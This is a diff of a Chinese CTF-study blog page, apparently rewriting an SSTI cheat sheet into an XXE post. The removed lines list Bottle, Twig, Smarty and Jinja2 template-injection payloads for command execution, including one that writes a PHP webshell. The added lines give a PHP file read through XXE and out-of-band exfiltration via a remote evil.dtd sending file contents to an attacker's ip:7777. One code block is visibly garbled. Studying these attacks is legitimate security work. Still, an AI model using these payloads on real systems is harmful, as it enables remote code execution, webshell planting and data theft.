@@ -19,24 +19,21 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="另外，bottle 可以直接通过 % python—code 或 &lt;% %&gt;执行, 但无回显，可以反弹shell或者打内存马通过abort可以直接回显 1%__import__(&#x27;bottle&#x27;).abort(404,__import__(%27os%27).popen(&#x27;env&#x27;).read())  bottle文档 bottle模板注入以及">
+    <meta name="description" content="参考文章xml、xpath注入 xml注入参考xss注入 xpath注入参考sql注入 xxe (xml外部实体引用)有回显情况12345678910111213$xmlfile&#x3D;file_get_contents(&#x27;php:&#x2F;&#x2F;input&#x27;)$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | L">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SSTI模版注入">
-<meta property="og:url" content="http://mekrina.github.io/blogs/SSTI/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="XXE">
+<meta property="og:url" content="http://mekrina.github.io/blogs/XXE/xxe/index.html">
 <meta property="og:site_name" content="mekrina">
-<meta property="og:description" content="另外，bottle 可以直接通过 % python—code 或 &lt;% %&gt;执行, 但无回显，可以反弹shell或者打内存马通过abort可以直接回显 1%__import__(&#x27;bottle&#x27;).abort(404,__import__(%27os%27).popen(&#x27;env&#x27;).read())  bottle文档 bottle模板注入以及">
+<meta property="og:description" content="参考文章xml、xpath注入 xml注入参考xss注入 xpath注入参考sql注入 xxe (xml外部实体引用)有回显情况12345678910111213$xmlfile&#x3D;file_get_contents(&#x27;php:&#x2F;&#x2F;input&#x27;)$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | L">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://mekrina.github.io/blogs/images/SSTI.png">
-<meta property="og:image" content="http://mekrina.github.io/blogs/images/bottle%E5%B5%8C%E5%85%A5python%E4%BB%A3%E7%A0%81.png">
 <meta property="article:published_time" content="2025-01-20T13:06:41.000Z">
-<meta property="article:modified_time" content="2025-03-23T06:44:29.559Z">
+<meta property="article:modified_time" content="2025-05-30T01:24:17.980Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://mekrina.github.io/blogs/images/SSTI.png">
   
   
   
-  <title>SSTI模版注入 - mekrina</title>
+  <title>XXE - mekrina</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +199,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="SSTI模版注入"></span>
+            <span id="subtitle" data-typed-text="XXE"></span>
           
         </div>
 
@@ -225,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1k 字
+          395 字
         
       </span>
     
@@ -236,7 +233,7 @@
         
         
         
-          9 分钟
+          4 分钟
         
       </span>
     
@@ -273,63 +270,30 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">SSTI模版注入</h1>
+            <h1 id="seo-header">XXE</h1>
             
             
               <div class="markdown-body">
                 
-                <p><img src="/blogs/images/SSTI.png" srcset="/blogs/img/loading.gif" lazyload alt="SSTI"></p>
-<p>另外，bottle 可以直接通过 <code>% python—code </code>或 <code>&lt;% %&gt;</code>执行, 但无回显，可以反弹shell或者打内存马<br>通过abort可以直接回显</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">%__import__(&#x27;bottle&#x27;).abort(404,__import__(%27os%27).popen(&#x27;env&#x27;).read())<br></code></pre></td></tr></table></figure>
+                <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/2994#toc-10">参考文章</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6887">xml、xpath注入</a></p>
+<h2 id="xml注入"><a href="#xml注入" class="headerlink" title="xml注入"></a>xml注入</h2><p>参考xss注入</p>
+<h2 id="xpath注入"><a href="#xpath注入" class="headerlink" title="xpath注入"></a>xpath注入</h2><p>参考sql注入</p>
+<h2 id="xxe-xml外部实体引用"><a href="#xxe-xml外部实体引用" class="headerlink" title="xxe (xml外部实体引用)"></a>xxe (xml外部实体引用)</h2><h3 id="有回显情况"><a href="#有回显情况" class="headerlink" title="有回显情况"></a>有回显情况</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$xmlfile</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>)<br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br><span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br><span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>payload &#x3D; </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hack</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span>  <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span> <br>        随意<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>其中<code>&amp;file;</code>用于引用访问结果<br>如果环境中装有expect扩展，把<code>php://filter/read=convert.base64-encode/resource=/flag</code>换成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs expect://ls```可以实现任意命令执行."><br><br>### 无回显<br><br>vps上部署evil.dtd<br><br>```dtd<br>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/temp/test.ps1&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:7777?p=%file;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/blogs/images/bottle%E5%B5%8C%E5%85%A5python%E4%BB%A3%E7%A0%81.png" srcset="/blogs/img/loading.gif" lazyload alt="bottle嵌入python代码"><br><a target="_blank" rel="noopener" href="https://www.osgeo.cn/bottle/stpl.html">bottle文档</a></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16942">bottle模板注入以及内存马</a><br><a target="_blank" rel="noopener" href="https://forum.butian.net/share/4048">bottle内存马</a></p>
-<p>需要注意原来的app是怎么运行的，<br>方式1：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">app = bottle.Bottle()<br>app.run<br></code></pre></td></tr></table></figure>
-<p>这时直接app.route(“&#x2F;shell”,”GET”,lambda:…)<br>也可以app.add_hook(…)<br>方式2：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">bottle.run<br></code></pre></td></tr></table></figure>
-<p>这时直接bottle.route修改路由可行<br>但是没有add_hook, 想执行bottle.Bottle().add_hook能执行,但是没有效果</p>
-<h2 id="twig模板注入"><a href="#twig模板注入" class="headerlink" title="twig模板注入"></a>twig模板注入</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9506">https://xz.aliyun.com/news/9506</a></p>
-<ol>
-<li>1.x版本payload: <code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("echo '<?=@eval($_POST[1]);?>' > flag.php")&#125;&#125;</code></li>
-<li>2.x&#x2F;3.x 版本payload：<code>&#123;&#123;["ls"]|map("system")&#125;&#125;</code>或者<code>&#123;&#123;["id"]|filter("system")&#125;&#125;</code>或者<code>&#123;&#123;["id", 0]|sort("system")&#125;&#125;</code>或者<code>&#123;&#123;[0, 0]|reduce("system", "id")&#125;&#125;</code></li>
-</ol>
-<h2 id="smarty模板注入"><a href="#smarty模板注入" class="headerlink" title="smarty模板注入"></a>smarty模板注入</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12220">https://xz.aliyun.com/t/12220</a></p>
-<p>曾经用到的方法：</p>
-<ol>
-<li>{if PHP代码}{&#x2F;if}<br> 如 {if system(‘cat &#x2F;flag’)}{&#x2F;if}</li>
-</ol>
-<h2 id="python模板注入漏洞"><a href="#python模板注入漏洞" class="headerlink" title="python模板注入漏洞"></a>python模板注入漏洞</h2><h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2>
-<h2 id="jinja"><a href="#jinja" class="headerlink" title="jinja"></a>jinja</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6481">各种过滤</a><br><code>__globals__[&#39;os&#39;]</code>可以用<code>__globals__.os</code>直接代替,省去了中括号引号</p>
-获取配置
-<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[WesternCTF2018]shrine">配置被手动置为none</a>时，可以从其他的地方访问config，由于他们不会被同时置为none，因此还保留原有配置。<br>payload:<br><code>&#123;&#123;self.__dict__&#125;&#125;</code><br><code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code><br><code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code></p>
-<h3 id="新姿势"><a href="#新姿势" class="headerlink" title="新姿势"></a>新姿势</h3><pre><code class="hljs">可以直接用undefined这个类，而且里面有很多可用函数，如 
-</code></pre>
-<p><code>&#123;&#123;a.__init__.__globals__.__builtins__.eval(\"__\\x69mport__('o'+'s').popen('ls /').read()\")&#125;&#125;</code><br><code>self[&#39;__in&#39;&#39;it__&#39;][&#39;__glo&#39;&#39;bals__&#39;][&#39;__buil&#39;&#39;tins__&#39;][&#39;__impo&#39;&#39;rt__&#39;](&#39;o&#39;&#39;s&#39;).popen(&#39;ls;ls /;nl /flag&#39;).read()</code><br><code>c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)</code><br><code>c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;fla&#39;+&#39;g&#39;,&#39;r&#39;).read()</code><br>    ，甚至不用找可用的类……<br><strong>常见payload</strong></p>
-<ol>
-<li><p><code>&#123;&#123;''.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__['o'+'s'].popen('ls').read()&#125;&#125;</code></p>
-</li>
-<li><p><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')&#125;&#125;</code></p>
-</li>
-<li><p><code>&#123;&#123;''.__class__.__mro__[0].__subclasses__()[40]("fl4g").read()&#125;&#125;</code>，其中[40]是file类</p>
-</li>
-<li><p><code>&#39;&#39;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](\&quot;__\\x69mport__(&#39;os&#39;).popen(&#39;cat+/flag&#39;).read()\&quot;)</code><br> 132指warnings.catch_warnings</p>
-</li>
-</ol>
-<p>当request没被过滤时,用request绕过</p>
-<p><strong>原理解释</strong></p>
-<p>Python复制</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    <span class="hljs-built_in">id</span> = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)<br>    html = <span class="hljs-string">&#x27;&lt;h3&gt;%s&lt;/h3&gt;&#x27;</span>%(<span class="hljs-built_in">id</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(html)<br></code></pre></td></tr></table></figure>
+<p>这部分必须在vps上是因为 只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>send前面的%必须要编码，可能如果不编码会被识别为参数，但找不到%send</p>
+<p>上传的xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE convert [<br>&lt;!ENTITY % remote SYSTEM &quot;http://ip:7777/evil.dtd&quot;&gt;<br>%remote;%int;%send;<br>]&gt;<br>&lt;user&gt;<br>    &lt;username&gt;www&lt;/username&gt;<br>    &lt;password&gt;&lt;/password&gt;<br>&lt;/user&gt;<br></code></pre></td></tr></table></figure>
 
-<p>某些渲染器如python-jinja会将<code>&#123;&#123;&#125;&#125;</code>内包围的内容视为变量，因此会先计算变量（本质上就是执行），因此可以在<code>&#123;&#123;&#125;&#125;</code>中写入想要执行的代码，这里的参数id可能比较特殊，参数值直接写在当前目录下就行。</p>
-<p>接下来就要找到os模块，利用popen函数来获取文件内容（popen用于执行命令，将执行结果输入到文件中，并返回这个文件对象）。</p>
-<p><code>__class__</code> 用于访问当前类，<code>__mro__</code> 访问当前类的基类，最后一个一般是object类，是所有类的基类，<code>__subclasses__()</code>方法返回基于当前类的所有之类，到这里可以得到所有可以用到的类，[71]中的数字可以用爆破的方式<code>&#123;&#123;url/"".__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__['os']&#125;&#125;</code>得到，目的是得到一个包含了，<code>__init__.__globals__</code>可以获得该类所在模块中的所有用到的全局变量，包括在该模块中引用的模块，返回类型是字典。</p>
-<h3 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h3><p>fenjing</p>
-<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>过滤关键词，如<code>os, eval</code>,可以用字符串拼接绕过<br>如<code>[&#39;ev&#39;+&#39;al&#39;]</code></p>
-<p>引号内的字符还可以使用hex或unicode编码绕过<br>如<code>[&#39;eval&#39;] --&gt; [&#39;\x65val&#39;]</code><br>由于python会对字符串自动转义一次,写\x65 等于写 e,因此要写成<code>[&#39;\\x65val&#39;]</code>,这样真正发送的才是\x65</p>
-<h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43995419/article/details/126811287">文章</a></p>
-<p>利用config保存，set设置，逐步简短最终payload</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.update(a=config.update)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(b=lipsum.__globals__)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(c=config.b.os)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(d=config.c.popen)%&#125;<br>&#123;&#123;config.d(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()&#125;&#125;<br>&#123;&#123;config.d(<span class="hljs-string">&#x27;cat /f*&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+<p><strong>疑问：</strong></p>
+<ol>
+<li>为什么vps的dtd文件中不能直接定义<br><code>&lt;!ENTITY % send SYSTEM &#39;http://ip:7777?p=%file;&#39; &gt;</code><br>然后执行 <code>%send;</code> ?</li>
+<li>为什么非得用参数实体？</li>
+</ol>
+
                 
               </div>
             
@@ -347,7 +311,7 @@
     
       <span class="category-chain">
         
-  <a href="/blogs/categories/SSTI/" class="category-chain-item">SSTI</a>
+  <a href="/blogs/categories/XXE/" class="category-chain-item">XXE</a>
   
   
 
@@ -367,8 +331,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>SSTI模版注入</div>
-      <div>http://mekrina.github.io/blogs/SSTI/ssti模版注入/</div>
+      <div>XXE</div>
+      <div>http://mekrina.github.io/blogs/XXE/xxe/</div>
     </div>
     <div class="license-meta">
       
@@ -412,9 +376,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blogs/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/" title="php命令执行函数">
+                      <a href="/blogs/uncategorized/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" title="http请求走私">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">php命令执行函数</span>
+                        <span class="hidden-mobile">http请求走私</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -422,8 +386,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/blogs/flask/flask-debug%E6%A8%A1%E5%BC%8F/" title="flask debug模式">
-                        <span class="hidden-mobile">flask debug模式</span>
+                      <a href="/blogs/SSTI/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/" title="SSTI模版注入">
+                        <span class="hidden-mobile">SSTI模版注入</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
